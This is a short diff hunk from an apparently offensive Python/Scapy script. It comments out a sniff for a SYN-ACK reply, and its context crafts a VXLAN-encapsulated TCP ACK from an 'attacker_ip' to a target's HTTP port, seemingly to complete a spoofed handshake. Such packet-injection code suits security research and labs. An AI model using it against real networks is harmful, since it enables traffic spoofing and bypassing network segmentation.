@@ -161,7 +161,7 @@ if debug:
         print("")
 
 #$$$$$ GET SYNACK : TCP flags SYN and ACK are set
-sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flags & SYN, prn=syn_ack_do, count = 1)
+#sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flags & SYN, prn=syn_ack_do, count = 1)
 
 #$$$$$ SEND ACK
 ack = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='A')
